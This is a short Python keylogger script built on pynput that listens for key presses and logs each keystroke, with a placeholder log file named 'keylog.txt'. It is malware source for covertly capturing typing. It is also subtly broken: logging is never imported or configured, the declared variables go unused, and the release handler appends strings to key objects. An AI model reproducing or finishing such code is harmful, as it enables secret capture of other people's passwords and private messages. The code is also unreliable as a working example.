from pynput.keyboard import Key, Listener

# Log file setup
log_file = "keylog.txt"

keys = []
# Function for key press
def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special Key {key} pressed")

# Function for key release
def on_release(key):
    if key == Key.esc:  # Fix here
        return False
    elif key == Key.enter:
        key += '\n'
    elif key == Key.tab:
        key += '\t'
        # Stop the listener

# Start listening
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    # complete
